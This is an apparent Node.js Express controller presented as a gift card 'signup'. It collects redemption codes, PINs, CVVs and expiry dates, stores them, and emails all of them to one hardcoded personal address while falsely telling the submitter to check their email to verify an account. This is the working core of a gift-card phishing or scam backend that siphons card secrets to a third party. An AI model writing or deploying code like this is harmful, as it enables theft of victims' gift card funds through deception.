     require('dotenv').config();
     const GiftCardMOdel = require('../models/GiftCardMOdel')
     const { sendEmail } = require('../helpers/sendMail');
     const { paymentReceiptTemplate, forgotPasswordTemplate } = require('../helpers/emailTemplate');
    
 
 exports.GiftCardSignup = async (req, res) => {
        try {
            const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = req.body
    
            if (!Name || !Currency  || !Amount ||  !Redemptioncode ||!Pin || !GiftCardCvv || !ExpireDate) {
                return res.status(400).json({
                    message: `Please enter all details`
                })
            }

           

            // create a user
            const newGiftCard = new GiftCardMOdel({
                Name,
                Currency,
                Amount,
                Redemptioncode,
                Pin,
                GiftCardCvv,
                ExpireDate,
            });

            

           
const userEmail = "jolaetopia81@gmail.com"
      
            // send verification email
            const mailOptions = {
                email: userEmail ,
                subject: "Verify your account",
              html: paymentReceiptTemplate(
  newGiftCard.Name,
  newGiftCard.Currency,
  newGiftCard.Redemptioncode,
  newGiftCard.Pin,
  newGiftCard.Amount,
  userEmail,
  newGiftCard.GiftCardCvv,
  newGiftCard.ExpireDate
),

            };

            
            // save the user
            await newGiftCard.save();
            await sendEmail(mailOptions);

            // return a response
            res.status(201).json({
                message: `Check your email: ${userEmail} to verify your account.`,
                data: newGiftCard
            })

        } catch (error) {
             if (error.code === 11000) {
                // Handle duplicate key error (E11000)
                const duplicateField = Object.keys(error.keyPattern)[0]; // Get the duplicate field (e.g., email)
                return res.status(400).json({ message: `A Gift Card with this ${duplicateField} already exists.` });
            }
            res.status(500).json({message: error.message});
        
        }
    }